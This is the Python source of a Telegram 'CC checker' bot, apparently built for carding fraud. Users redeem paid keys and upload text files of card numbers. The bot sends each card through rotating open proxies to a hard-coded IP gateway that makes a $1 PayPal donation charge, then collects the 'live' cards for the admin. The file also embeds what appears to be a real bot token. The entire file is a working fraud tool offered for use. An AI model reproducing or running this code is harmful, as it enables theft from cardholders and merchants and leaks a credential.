from telebot import TeleBot, types
import requests
import time
import random
import string
from datetime import datetime, timedelta
import sys

bot = TeleBot("8663863938:AAHr0p7MNlaKDbZNVDgMD8QLVUOm7ZS79do")

GATEWAY = "http://138.128.240.15:8025/paypal_donate?cc="

ADMIN_ID = 7077294261

allowed_users = {}
active_keys = {}
live_cards = []
stop_flags = {}

allowed_users[ADMIN_ID] = datetime.now() + timedelta(days=999)

proxies_list = [
    "http://148.230.4.241:999",
    "http://2.78.60.10:3129",
    "http://1.231.81.166:3128",
    "http://45.167.124.71:999",
    "http://103.157.200.126:3128",
    "http://80.92.204.47:1081",
    "http://86.104.72.220:1082",
    "http://20.127.128.70:8080",
    "http://47.85.51.197:1080",
    "http://45.140.147.82:1082",
    "http://104.128.138.186:1080"
]

current_proxy = 0

def print_log(text):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {text}", file=sys.stdout, flush=True)

def generate_key():
    return "KEY-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def get_proxy():
    global current_proxy
    proxy = proxies_list[current_proxy % len(proxies_list)]
    current_proxy += 1
    print_log(f"AUTO PROXY → {proxy}")
    return {"http": proxy, "https": proxy}

@bot.message_handler(commands=['start'])
def start(m):
    user_id = m.from_user.id
    if user_id in allowed_users and allowed_users[user_id] > datetime.now():
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data="start_checking"))
        bot.send_message(m.chat.id, "Let’s check cc send txt file and tap on start checking 🥂", reply_markup=markup)
    else:
        bot.send_message(m.chat.id, "🔐 **Access Declined**\n\nKey redeem karo: `/redeem <key>`")

@bot.callback_query_handler(func=lambda call: call.data == "start_checking")
def start_checking(call):
    bot.send_message(call.message.chat.id, "📁 Ab txt file bhej do mass check ke liye")

@bot.message_handler(commands=['redeem'])
def redeem_key(m):
    if len(m.text.split()) < 2:
        bot.reply_to(m, "Usage: `/redeem KEY-XXXXXXXX`")
        return
    key = m.text.split(maxsplit=1)[1].strip()
    if key in active_keys and active_keys[key] > datetime.now():
        allowed_users[m.from_user.id] = active_keys[key]
        bot.reply_to(m, f"✅ **Key Accepted!**\nExpiry: {active_keys[key].strftime('%Y-%m-%d')}")
        del active_keys[key]
    else:
        bot.reply_to(m, "❌ **Invalid or Expired Key**")

@bot.message_handler(commands=['admin'])
def admin_panel(m):
    if m.from_user.id != ADMIN_ID:
        bot.reply_to(m, "❌ Admin only")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔑 30 Days Key", callback_data="gen_key_30"),
        types.InlineKeyboardButton("🔑 7 Days Key", callback_data="gen_key_7"),
        types.InlineKeyboardButton("👥 User List", callback_data="user_list"),
        types.InlineKeyboardButton("💳 Live Cards", callback_data="show_live")
    )
    bot.send_message(m.chat.id, "🛠 **Admin Panel**", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def admin_callback(call):
    if call.from_user.id != ADMIN_ID:
        return

    if call.data == "gen_key_30":
        key = generate_key()
        expiry = datetime.now() + timedelta(days=30)
        active_keys[key] = expiry
        bot.send_message(call.message.chat.id, f"✅ **30 Days Key**\n`{key}`\nExpiry: {expiry.strftime('%Y-%m-%d')}")

    elif call.data == "gen_key_7":
        key = generate_key()
        expiry = datetime.now() + timedelta(days=7)
        active_keys[key] = expiry
        bot.send_message(call.message.chat.id, f"✅ **7 Days Key**\n`{key}`\nExpiry: {expiry.strftime('%Y-%m-%d')}")

    elif call.data == "user_list":
        if not allowed_users:
            bot.send_message(call.message.chat.id, "Koi active user nahi")
        else:
            text = "👥 **Active Users:**\n\n"
            for uid, exp in allowed_users.items():
                text += f"ID: `{uid}` | Expiry: {exp.strftime('%Y-%m-%d')}\n"
            bot.send_message(call.message.chat.id, text)

    elif call.data == "show_live":
        if not live_cards:
            bot.send_message(call.message.chat.id, "Koi live card nahi")
        else:
            text = "💳 **Live Cards:**\n\n" + "\n".join(live_cards[-30:])
            bot.send_message(call.message.chat.id, text)

# Mass Check
@bot.message_handler(content_types=['document'])
def handle_file(m):
    if not m.document.file_name.endswith('.txt'):
        bot.reply_to(m, "Sirf .txt file bhej")
        return

    file_info = bot.get_file(m.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    cards = [line.strip() for line in downloaded.decode('utf-8').splitlines() if line.strip()]

    if not cards:
        bot.reply_to(m, "File empty hai")
        return

    stop_flags[m.chat.id] = False
    live = 0
    dead = 0

    progress_msg = bot.send_message(m.chat.id, "🔄 Starting fast check...")

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 Stop", callback_data="stop_check"))

    print_log(f"Fast mass check started with {len(cards)} cards by user {m.from_user.id}")

    for i, card in enumerate(cards):
        if stop_flags.get(m.chat.id):
            bot.edit_message_text("🛑 Stopped by user", m.chat.id, progress_msg.message_id)
            print_log("Mass check stopped by user")
            break

        proxy = get_proxy()

        bot.edit_message_text(
            f"💳 **Current card:**\n`{card}`\n\n"
            f"📊 **Status:** Checking...\n"
            f"💎 **Charged:** {live}\n"
            f"❌ **Declined:** {dead}\n"
            f"📊 **Total:** {len(cards)}",
            m.chat.id, progress_msg.message_id,
            reply_markup=markup
        )

        try:
            url = GATEWAY + card.replace(" ", "")
            r = requests.get(url, proxies=proxy, timeout=12)
            resp = r.text

            if any(x in resp.lower() for x in ["charge", "charged", "approved", "success", "live"]):
                live += 1
                live_cards.append(card)
                bot.send_message(m.chat.id, f"✅ **1$ Charged - Card Approved**\n{card}")
                print_log(f"LIVE CARD: {card}")
            else:
                dead += 1
                print_log(f"Declined: {card}")

        except Exception as e:
            dead += 1
            print_log(f"Error on {card}: {e}")

        time.sleep(0.5)

    bot.edit_message_text(
        f"✅ **CHECKING COMPLETE**\n\n"
        f"💎 **Charged:** {live}\n"
        f"❌ **Declined:** {dead}\n"
        f"📊 **Total:** {len(cards)}",
        m.chat.id, progress_msg.message_id
    )

    print_log(f"Mass check finished. Charged: {live} | Dead: {dead}")

@bot.callback_query_handler(func=lambda call: call.data == "stop_check")
def stop_check(call):
    stop_flags[call.message.chat.id] = True
    bot.answer_callback_query(call.id, "Stopping...")
    print_log("Stop button pressed")

bot.infinity_polling()
